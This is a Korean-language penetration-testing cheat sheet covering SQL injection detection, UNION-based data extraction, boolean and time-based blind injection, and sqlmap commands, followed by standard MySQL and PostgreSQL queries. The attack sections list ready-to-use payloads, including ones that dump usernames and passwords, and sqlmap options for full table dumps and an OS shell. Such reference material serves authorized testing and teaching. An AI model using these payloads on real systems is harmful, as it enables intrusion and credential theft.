---
title: "SQL 인젝션 및 데이터베이스 쿼리: 펜테스터 레퍼런스"
description: "SQL 인젝션 페이로드, UNION 공격, 블라인드 SQLi 기술, MySQL 및 PostgreSQL 표준 데이터베이스 쿼리. 침투 테스터와 데이터베이스 관리자를 위한 전술적 레퍼런스."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["SQL 인젝션 페이로드", "MySQL 명령어 치트시트", "PostgreSQL 치트시트", "데이터베이스 해킹", "sqlmap 명령어", "UNION SQL 인젝션", "블라인드 SQL 인젝션", "SQL 인젝션 테스트", "데이터베이스 열거", "SQL 인젝션 방지"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL 인젝션 및 데이터베이스 쿼리: 펜테스터 레퍼런스",
    "description": "SQL 인젝션 페이로드, UNION 공격, 블라인드 SQLi, MySQL 및 PostgreSQL 데이터베이스 쿼리.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "ko"
  }
---

## 시스템 초기화

SQL 인젝션은 웹 애플리케이션의 가장 치명적인 취약점 중 하나로 남아 있으며 — OWASP Top 10에 지속적으로 포함되고 있습니다. 이는 사용자 입력이 적절한 살균 없이 SQL 쿼리에 직접 연결될 때 발생하며, 공격자가 데이터베이스 쿼리 로직을 조작할 수 있게 합니다. 성공적인 SQL 인젝션은 완전한 데이터 유출, 인증 우회, 권한 상승, 그리고 경우에 따라 데이터베이스 서버에서의 원격 명령 실행으로 이어질 수 있습니다. 이 실전 매뉴얼은 인가된 침투 테스트를 위한 공격 페이로드와 모든 데이터베이스 관리자가 알아야 할 표준 SQL 쿼리를 모두 제공합니다.

모든 인젝션 기술은 인가된 테스트 전용입니다. 무단 접근은 불법입니다.

---

## SQLi 탐지

SQL 인젝션 취약점을 악용하기 전에 그 존재를 확인해야 합니다. 탐지는 특수하게 조작된 입력을 애플리케이션 파라미터에 전송하고 오류 메시지, 동작 변화 또는 시간 차이에 대한 응답을 관찰하는 것을 포함합니다. 이러한 초기 프로브는 파라미터가 인젝션 가능한지와 어떤 유형의 인젝션이 가능한지를 알려줍니다.

### 기본 탐지 페이로드

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### 데이터베이스 백엔드 식별

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## UNION 공격

UNION 기반 SQL 인젝션은 오류 메시지나 쿼리 결과가 페이지에 표시될 때 가장 강력한 기술입니다. 원래 쿼리에 `UNION SELECT` 문을 추가하여 작동하며, 데이터베이스의 모든 테이블에서 데이터를 추출할 수 있습니다. 핵심 요구 사항은 UNION 문이 일치하도록 원래 쿼리의 정확한 컬럼 수를 결정하는 것입니다.

### 컬럼 수 결정

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### 데이터 추출

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## 블라인드 SQL 인젝션

애플리케이션이 쿼리 결과나 오류 메시지를 페이지에 표시하지 않을 때, 블라인드 SQL 인젝션을 다루고 있는 것입니다. 취약점은 여전히 존재하지만, 데이터 추출에는 추론이 필요합니다 — 불리언 조건(페이지가 변하는가?)이나 시간 지연(응답이 더 오래 걸리는가?)을 통해서 말입니다. 블라인드 SQLi는 더 느리지만 동일하게 위험합니다.

### 불리언 기반 블라인드

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### 시간 기반 블라인드

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## SQLMap 자동화

SQLMap은 SQL 인젝션의 자동 탐지 및 악용을 위한 업계 표준 도구입니다. 탐지, 핑거프린팅, 데이터 추출, 심지어 SQL 인젝션을 통한 OS 수준 접근까지 — 모두 커맨드 라인에서 처리합니다. 인가된 침투 테스트에서 악용 단계를 크게 가속화합니다.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## 표준 SQL 쿼리

인젝션 테스트 외에도, 모든 보안 전문가와 개발자는 데이터베이스 관리, 로그 분석, 조사 중 데이터 추출을 위해 표준 SQL을 알아야 합니다. 이 쿼리들은 MySQL과 PostgreSQL 모두에서 작동하며 가장 일반적인 데이터베이스 작업을 다룹니다.

### SELECT 쿼리

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### JOIN 쿼리

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### 데이터베이스 관리

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
